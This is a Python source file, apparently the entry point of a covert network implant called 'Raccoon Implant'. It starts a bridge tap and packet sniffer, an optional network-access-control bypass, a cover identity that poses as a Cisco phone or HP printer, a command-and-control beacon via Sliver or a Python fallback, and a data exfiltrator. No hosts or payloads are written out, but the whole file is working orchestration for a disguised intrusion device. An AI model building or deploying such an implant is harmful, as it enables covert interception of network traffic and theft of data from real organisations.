#!/usr/bin/env python3
"""
Raccoon Implant — main orchestrator.
Starts bridge tap, sniffer, cover identity, and C2 beacon.
"""

import logging
import signal
import sys
import time
from pathlib import Path

import yaml


def setup_logging(config: dict):
    log_cfg = config.get("logging", {})
    log_dir = Path(log_cfg.get("log_dir", "/opt/raccoon/logs"))
    log_dir.mkdir(parents=True, exist_ok=True)

    from logging.handlers import RotatingFileHandler

    fmt = logging.Formatter("%(asctime)s [%(name)s] %(levelname)s %(message)s")

    file_handler = RotatingFileHandler(
        log_dir / "raccoon.log",
        maxBytes=log_cfg.get("max_size_mb", 5) * 1024 * 1024,
        backupCount=log_cfg.get("backup_count", 3),
    )
    file_handler.setLevel(getattr(logging, log_cfg.get("file_level", "DEBUG").upper()))
    file_handler.setFormatter(fmt)

    console_handler = logging.StreamHandler()
    console_handler.setLevel(getattr(logging, log_cfg.get("console_level", "INFO").upper()))
    console_handler.setFormatter(fmt)

    root = logging.getLogger()
    root.setLevel(logging.DEBUG)
    root.addHandler(file_handler)
    root.addHandler(console_handler)


def load_config(path: str = None) -> dict:
    candidates = [
        path,
        "/opt/raccoon/configs/raccoon.yaml",
        str(Path(__file__).parent.parent / "configs" / "raccoon.yaml"),
    ]
    for p in candidates:
        if p and Path(p).exists():
            with open(p) as f:
                config = yaml.safe_load(f)
            _require_beacon_key(config)
            return config
    print("No config file found", file=sys.stderr)
    sys.exit(1)


def _require_beacon_key(config) -> None:
    """Refuse to start when the Python beacon could run with no usable key.

    Done here, before the sniffer and the cover are brought up: a failure
    at the point the beacon is built would leave a half-started process,
    and skipping only the beacon would leave a drop-box that is alive and
    never calls back. Only a config that can build the beacon is asked for
    a key.
    """
    from software.c2.beacon import beacon_key_problem
    problem = beacon_key_problem(config)
    if problem:
        print("Refusing to start: " + problem, file=sys.stderr)
        sys.exit(1)


def _check_agent_beacon_conflict(config) -> None:
    """Warn when the agent layer and Sliver are both switched on.

    A Sliver-managed box talks to the Sliver server, not to this team
    server, so it never checks in here -- and the agent plans against what
    the team server knows. The box is therefore invisible to it, and the
    symptom is a campaign that finds no beacons, which sends the reader
    looking at the agent rather than at this setting.

    A warning and nothing else. The shipped configs/raccoon.yaml has Sliver
    enabled and no `agent:` block at all, so the status quo stays silent;
    only a deployment that asked for both hears about it.
    """
    if not isinstance(config, dict):
        return
    agent = config.get("agent")
    if not isinstance(agent, dict) or not agent.get("enabled"):
        return
    c2 = config.get("c2")
    sliver = c2.get("sliver") if isinstance(c2, dict) else None
    if not isinstance(sliver, dict) or not sliver.get("enabled"):
        return
    logging.getLogger("raccoon").warning(
        "both the agent layer and Sliver are enabled: a Sliver-managed "
        "drop-box checks in with the Sliver server, never with this team "
        "server, so the agent cannot see it or task it. Run the Python "
        "beacon on any box the agent is meant to drive, or switch "
        "c2.sliver.enabled off.")


def main():
    import argparse
    parser = argparse.ArgumentParser(description="Raccoon Implant")
    parser.add_argument("-c", "--config", help="Path to raccoon.yaml")
    args = parser.parse_args()

    config = load_config(args.config)
    setup_logging(config)
    logger = logging.getLogger("raccoon")
    _check_agent_beacon_conflict(config)

    from software.notifications import init_notifier
    notifier = init_notifier(config)
    logger.info("Notifications: %s", "enabled" if notifier.enabled else "disabled")

    logger.info("=" * 60)
    logger.info("  Raccoon Implant starting")
    logger.info("=" * 60)

    components = []

    if config["sniffer"]["enabled"]:
        from software.sniffer.bridge_tap import BridgeTap
        from software.watchdog import set_bridge_tap
        bridge = BridgeTap(config)
        if not bridge.setup_bridge():
            logger.error("Bridge setup failed — aborting")
            sys.exit(1)
        set_bridge_tap(bridge)
        components.append(("bridge", bridge))

    if config.get("nac_bypass", {}).get("enabled"):
        from software.nac_bypass import NACBypass
        nac = NACBypass(config)
        nac.start()
        components.append(("nac_bypass", nac))
        logger.info("NAC bypass enabled — running in background")

    if config["cover"]["enabled"]:
        cover_mode = config.get("device_mode", "cisco_phone")
        if cover_mode == "hp_printer":
            from software.cover.hp_printer import HPPrinterCover
            cover = HPPrinterCover(config)
        else:
            from software.cover.cisco_phone import CiscoCover
            cover = CiscoCover(config)
        cover.start()
        cover_cfg = config["cover"].get(cover_mode, {})
        logger.info("Cover mode: %s (hostname: %s, model: %s)",
                     cover_mode,
                     cover_cfg.get("hostname", "auto"),
                     cover_cfg.get("model", "default"))
        components.append(("cover", cover))

    if config["c2"]["enabled"]:
        from software.c2.beacon_standalone import already_running as beacon_already_running
        if beacon_already_running():
            logger.info("Standalone beacon already running — skipping embedded C2")
        else:
            c2_cfg = config["c2"]
            sliver_cfg = c2_cfg.get("sliver", {})
            fallback_cfg = c2_cfg.get("fallback", {})

            sliver_started = False
            if sliver_cfg.get("enabled"):
                from software.c2.sliver import SliverManager
                sliver = SliverManager(config)
                if sliver.is_implant_available or sliver_cfg.get("staging_url"):
                    sliver.start()
                    components.append(("sliver", sliver))
                    sliver_started = True
                    logger.info("Sliver implant manager started")
                else:
                    logger.warning("Sliver enabled but binary not found at %s — trying fallback",
                                   sliver_cfg.get("implant_path"))

            if not sliver_started and fallback_cfg.get("enabled"):
                from software.c2.beacon import (Beacon,
                                                beacon_config_from_fallback)
                beacon = Beacon(beacon_config_from_fallback(c2_cfg))
                beacon.start()
                components.append(("beacon", beacon))
                logger.info("Python fallback beacon started")

        from software.c2.exfil import Exfiltrator
        exfil = Exfiltrator(config)
        exfil.start()
        components.append(("exfil", exfil))

    shutdown = False

    def handle_signal(sig, frame):
        nonlocal shutdown
        shutdown = True

    signal.signal(signal.SIGINT, handle_signal)
    signal.signal(signal.SIGTERM, handle_signal)

    if config["sniffer"]["enabled"]:
        import threading
        sniff_thread = threading.Thread(target=bridge.start_capture, daemon=True, name="sniffer")
        sniff_thread.start()

    logger.info("All components started — operational")

    while not shutdown:
        time.sleep(1)

    logger.info("Shutdown initiated")
    for name, component in reversed(components):
        logger.info("Stopping %s...", name)
        component.stop()

    if config["sniffer"]["enabled"]:
        bridge.teardown_bridge()

    logger.info("Raccoon Implant offline")


if __name__ == "__main__":
    main()
